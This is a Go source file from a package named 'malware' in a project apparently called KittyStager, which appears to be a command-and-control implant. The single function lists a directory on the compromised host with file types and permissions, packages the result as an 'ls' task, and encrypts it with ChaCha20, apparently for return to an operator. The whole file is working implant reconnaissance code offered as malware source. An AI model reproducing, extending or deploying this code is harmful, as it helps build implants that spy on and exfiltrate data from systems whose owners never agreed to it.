package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"os"
	"io/fs"
	"fmt"
)

func getFileListing(key string, path string) ([]byte, error) {
	var file_name = ""
	var files_out = ""
	files, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		file_name = f.Name()
		fi, err := os.Lstat(path + "\\" + file_name)
		if err != nil {
			return nil, err
		}
		switch mode := fi.Mode(); {
		case mode.IsRegular():
			s := fmt.Sprintf("%s\t%s\t%s\n", "File", fi.Mode().Perm(), f.Name())
			files_out = files_out + s 
		case mode.IsDir():
			s := fmt.Sprintf("%s\t%s\t%s\n", "Dir", fi.Mode().Perm(), f.Name())
			files_out = files_out + s 
		case mode&fs.ModeSymlink != 0:
			s := fmt.Sprintf("%s\t%s\t%s\n", "Symbolic Link", fi.Mode().Perm(), f.Name())
			files_out = files_out + s 
		case mode&fs.ModeNamedPipe != 0:
			s := fmt.Sprintf("%s\t%s\t%s\n", "Named Pipe", fi.Mode().Perm(), f.Name())
			files_out = files_out + s 
		}
	}
	
	t := task.NewTask("ls", []byte(files_out))
	tm, err := t.MarshallTask()
	if err != nil {
		return nil, err
	}
	c := crypto.NewChaCha20()
	e, err := c.Encrypt(tm, []byte(key))
	if err != nil {
		return nil, err
	}
	return e, nil
}
